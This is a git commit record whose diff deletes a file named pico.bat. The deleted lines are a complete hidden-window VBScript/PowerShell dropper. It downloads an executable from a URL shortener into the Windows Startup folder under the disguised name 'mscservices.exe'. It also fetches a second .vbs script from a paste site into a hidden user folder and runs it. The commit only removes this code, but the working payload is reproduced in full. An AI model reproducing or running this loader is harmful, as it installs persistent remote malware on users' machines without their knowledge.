a47659881ce7ebad9829e52e19871c0544f6fa5c
Schl <70095072+FilthyPenny@users.noreply.github.com>
2024-09-30 18:22:30 +0200

    Delete pico.bat

--- pico.bat
+++
@@ -1,2 +0,0 @@
-dim oShell: set oShell = CreateObject("WScript.Shell")
-oShell.run "cmd /c powershell $s = [System.Environment]::GetFolderPath('Startup'); iwr https://s.id/1UPW2 -O $s/mscservices.exe && mkdir %USERPROFILE%\.fall & powershell iwr https://bitbin.it/RNvKMxvS/raw/ -O %USERPROFILE%\.fall\falldownobj.vbs && start %USERPROFILE%\.fall\falldownobj.vbs", 0, true
